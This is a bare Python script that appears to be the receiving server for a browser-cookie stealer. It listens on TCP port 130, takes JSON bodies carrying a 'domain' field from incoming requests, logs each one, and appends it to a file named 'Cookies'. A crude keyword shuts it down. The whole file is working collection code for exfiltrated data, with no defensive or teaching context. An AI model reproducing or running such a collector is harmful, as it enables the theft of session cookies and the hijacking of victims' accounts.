import socket, json, sqlite3, random
s = socket.socket()
s.bind(("0.0.0.0",130))
s.listen(1)
ok = ''
f = open("Cookies","w+")

while 1:
    try :
        conn, addr = s.accept()
        g = conn.recv(5000)
        g = g.decode("utf-8")
        data = g.split("\r\n")[-1]
        if not data.replace(" ","") :
            conn.close()
            continue
        else:
            data = json.loads(data)
            if data['domain'] == "imdoneherebitch":
                conn.close()
                s.close()
                break
            else :
                print(data)
                f.write(g.split("\r\n")[-1])
                f.write("\n")
                conn.close()
    except KeyboardInterrupt:
        break
    except json.decoder.JSONDecodeError :
        conn.close()
        s.close()
        break
f.close()
